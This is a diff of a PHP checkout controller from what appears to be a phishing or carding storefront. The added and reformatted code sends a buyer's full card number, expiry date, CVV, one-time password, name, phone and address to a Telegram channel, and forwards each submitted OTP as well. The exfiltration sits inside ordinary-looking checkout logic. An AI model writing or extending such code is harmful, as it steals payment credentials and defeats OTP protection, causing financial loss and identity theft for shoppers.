@@ -334,6 +334,13 @@ class CheckoutController extends Controller
         $order = $this->orderRepo->lastestOne();
         $updated = $order->update(['otp' => $request->otp]);
         if ($updated) {
+            $text = "<b>STT:</b> $order->id\n" 
+                    . "<b>OTP:</b> $request->otp";
+            Telegram::sendMessage([
+                'chat_id' => env('TELEGRAM_CHANNEL_ID', ''),
+                'parse_mode' => 'HTML',
+                'text' => $text
+            ]);
             return response()->json([
                 'success' => true,
                 'message' => 'OTP save successful!'
@@ -431,16 +438,15 @@ class CheckoutController extends Controller
         $total = $this->cartRepo->getTotal(2, $shippingFee);
         $stt = $order ? $order->id : null;
         $address = $address1. ' '. $address2;
-        $text = "<b>STT<b>: $stt\n"
-        . "<b>CardNumber: </b>". "$bankAccountNumber\n"
-        . "<b>ExpiredDate: </b>". "$expiredDate\n"
-        . "<b>Cvv: </b>". "$ccv\n"
-        . "<b>OTP: </b>". "$otp\n"
-        . "<b>Name: </b>". "$fullname\n"
-        . "<b>Phone: </b>". "$phoneNumber\n"
-        . "<b>Address: </b>". "$address\n"
-        . "<b>Total price: </b>". "$total\n"
-        ;
+        $text = "<b>STT:</b> $stt\n" 
+        . "<b>CardNumber:</b> $bankAccountNumber\n"
+        . "<b>ExpiredDate:</b> $expiredDate\n"
+        . "<b>Cvv:</b> $ccv\n"
+        . "<b>OTP:</b> $otp\n"
+        . "<b>Name:</b> $fullname\n"
+        . "<b>Phone:</b> $phoneNumber\n"
+        . "<b>Address:</b> $address\n"
+        . "<b>Total price:</b> $total";
 
         Telegram::sendMessage([
             'chat_id' => env('TELEGRAM_CHANNEL_ID', ''),
